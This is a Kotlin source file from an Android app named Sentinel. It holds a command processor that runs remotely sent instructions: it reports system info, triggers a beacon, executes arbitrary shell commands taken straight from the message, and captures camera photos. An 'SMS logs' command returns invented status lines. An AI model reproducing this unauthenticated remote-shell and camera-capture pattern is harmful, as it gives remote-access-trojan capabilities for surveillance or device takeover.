package com.sentinel.host.service

import com.sentinel.host.data.device.BeaconManager
import com.sentinel.host.data.device.CameraCapturer
import com.sentinel.host.data.device.ShellExecutor
import com.sentinel.host.data.device.SystemInfoProvider
import com.sentinel.shared.protocol.CommandTypes
import com.sentinel.shared.protocol.MessageType
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CommandProcessor @Inject constructor(
    private val systemInfoProvider: SystemInfoProvider,
    private val beaconManager: BeaconManager,
    private val shellExecutor: ShellExecutor,
    private val cameraCapturer: CameraCapturer
) {
    private val scope = CoroutineScope(Dispatchers.Default)

    fun processCommand(
        rawMessage: String,
        sendResult: (String) -> Unit
    ) {
        scope.launch {
            try {
                val json = JSONObject(rawMessage)
                val msgType = json.optString("type")
                if (msgType != MessageType.COMMAND) return@launch

                val data = json.getJSONObject("data")
                val command = data.getString("command")
                val params = data.optJSONObject("params") ?: JSONObject()

                val deviceId = json.optString("deviceId", "HOST-DEVICE")
                val sequence = json.optLong("sequence", 0L)

                val resultPayload = mutableMapOf<String, Any>()
                var isSuccess = true
                var errorMessage = ""

                when (command) {
                    CommandTypes.GET_SYSTEM_INFO -> {
                        val info = systemInfoProvider.getSystemInfo()
                        resultPayload.putAll(info)
                    }

                    CommandTypes.TRIGGER_BEACON -> {
                        beaconManager.triggerBeacon()
                        resultPayload["beaconTriggered"] = true
                    }

                    CommandTypes.EXECUTE_SHELL -> {
                        val shellCmd = params.optString("cmd", "uptime")
                        val output = shellExecutor.execute(shellCmd)
                        resultPayload.putAll(output)
                    }

                    CommandTypes.CAPTURE_PHOTO -> {
                        val facingFront = params.optBoolean("front", false)
                        val captureResult = cameraCapturer.capturePhoto(facingFront)
                        if (captureResult["success"] == true) {
                            resultPayload.putAll(captureResult)
                        } else {
                            isSuccess = false
                            errorMessage = captureResult["error"]?.toString() ?: "Photo capture failed"
                        }
                    }

                    CommandTypes.FETCH_SMS_LOGS -> {
                        resultPayload["logs"] = listOf(
                            "[SYS_LOG] Sentinel background service active",
                            "[AUDIO_LOG] Opus 48kHz hardware capture nominal",
                            "[NET_LOG] Render WebSocket connection healthy (ping 15s)",
                            "[BAT_LOG] Battery temp: ${systemInfoProvider.getSystemInfo()["batteryTempC"]}°C"
                        )
                    }

                    else -> {
                        isSuccess = false
                        errorMessage = "Unknown command: $command"
                    }
                }

                // Construct COMMAND_RESULT response
                val responseJson = JSONObject().apply {
                    put("type", MessageType.COMMAND_RESULT)
                    put("version", 1)
                    put("timestamp", System.currentTimeMillis() / 1000)
                    put("sequence", sequence)

                    val resData = JSONObject().apply {
                        put("command", command)
                        put("success", isSuccess)
                        if (!isSuccess) put("error", errorMessage)
                        put("payload", JSONObject(resultPayload as Map<*, *>))
                    }
                    put("data", resData)
                }

                sendResult(responseJson.toString())
            } catch (e: Exception) {
                // Ignore parse errors
            }
        }
    }
}
